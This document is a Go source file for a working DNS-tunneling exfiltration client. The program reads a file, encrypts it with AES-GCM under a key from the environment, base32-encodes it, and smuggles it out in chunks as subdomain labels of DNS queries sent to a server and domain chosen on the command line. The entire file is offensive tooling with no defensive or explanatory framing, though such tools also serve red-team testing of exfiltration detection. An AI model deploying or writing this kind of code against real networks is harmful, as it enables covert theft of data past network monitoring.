package main

import (
        "context"
        "crypto/aes"
        "crypto/cipher"
        "crypto/rand"
        "encoding/base32"
        "encoding/hex"
        "flag"
        "fmt"
        "io"
        "log"
        "math"
        "os"
        "strconv"
        "time"

        "github.com/google/uuid"
        "github.com/joho/godotenv"
        "github.com/miekg/dns"
)

var (
        exfilKey []byte
        maxRetries = 3
)

func init() {
        _ = godotenv.Load()
        keyHex := os.Getenv("EXFIL_KEY")
        var err error
        exfilKey, err = hex.DecodeString(keyHex)
        if err != nil || len(exfilKey) != 32 {
                log.Fatalf("Invalid EXFIL_KEY (must be 64 hex characters / 32 bytes): %v", keyHex)
        }
}

func encryptAESGCM(data []byte) ([]byte, error) {
        block, err := aes.NewCipher(exfilKey)
        if err != nil {
                return nil, err
        }
        aesgcm, err := cipher.NewGCM(block)
        if err != nil {
                return nil, err
        }
        nonce := make([]byte, 12)
        if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
                return nil, err
        }
        ciphertext := aesgcm.Seal(nil, nonce, data, nil)
        return append(nonce, ciphertext...), nil
}

func encodeFileBase32(path string) (string, error) {
        raw, err := os.ReadFile(path)
        if err != nil {
                return "", err
        }
        encrypted, err := encryptAESGCM(raw)
        if err != nil {
                return "", err
        }
        encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(encrypted)
        return encoded, nil
}

func chunkString(data string, size int) []string {
        var out []string
        for i := 0; i < len(data); i += size {
                end := i + size
                if end > len(data) {
                        end = len(data)
                }
                out = append(out, data[i:end])
        }
        return out
}

func makeSegments(encoded, identifier string) ([]string, int, int) {
        estChunk := 48
        estSegments := int(math.Ceil(float64(len(encoded)) / float64(estChunk)))
        idxDigits := len(strconv.Itoa(estSegments - 1))
        totDigits := len(strconv.Itoa(estSegments))
        overhead := len(identifier) + idxDigits + totDigits + 3
        chunkSize := 63 - overhead
        segments := chunkString(encoded, chunkSize)
        return segments, len(segments), chunkSize
}

func reliableSend(subdomain, domain, server string, port int) bool {
        fqdn := fmt.Sprintf("%s.%s.", subdomain, domain)
        m := new(dns.Msg)
        m.SetQuestion(fqdn, dns.TypeA)

        c := new(dns.Client)
        c.Timeout = 2 * time.Second
        serverAddr := fmt.Sprintf("%s:%d", server, port)

        for attempt := 1; attempt <= maxRetries; attempt++ {
                resp, _, err := c.ExchangeContext(context.Background(), m, serverAddr)
                if err == nil && resp != nil {
                        log.Printf("✓ Response received for [%s]", fqdn)
                        return true
                }
                log.Printf("⚠️ Timeout (attempt %d) for chunk [%s]", attempt, subdomain[:min(40, len(subdomain))])
        }
        return false
}

func min(a, b int) int {
        if a < b {
                return a
        }
        return b
}

func main() {
        serverIP := flag.String("server-ip", "127.0.0.1", "DNS server IP")
        serverPort := flag.Int("server-port", 5300, "DNS server port")
        filePath := flag.String("file-path", "", "File to exfiltrate")
        domain := flag.String("domain", "xf.example.com", "Domain to send DNS queries to")
        flag.Parse()

        if *filePath == "" {
                log.Fatal("File path is required (--file-path)")
        }

        identifier := uuid.New().String()[:8]
        encoded, err := encodeFileBase32(*filePath)
        if err != nil {
                log.Fatalf("Encoding error: %v", err)
        }

        segments, total, chunkSize := makeSegments(encoded, identifier)
        log.Printf("Sending %d chunks (chunk size = %d) for identifier: %s", total, chunkSize, identifier)

        failures := []int{}

        for i, chunk := range segments {
                subdomain := fmt.Sprintf("%s-%d-%d-%s", identifier, i, total, chunk)
                if len(subdomain) > 63 {
                        log.Printf("❗ Subdomain too long (%d): %s", len(subdomain), subdomain)
                        continue
                }
                if !reliableSend(subdomain, *domain, *serverIP, *serverPort) {
                        failures = append(failures, i)
                }
        }

        if len(failures) > 0 {
                log.Printf("\n❌ Failed to send %d chunks after %d retries: %v", len(failures), maxRetries, failures)
        } else {
                log.Println("\n✅ All chunks sent successfully.")
        }
}
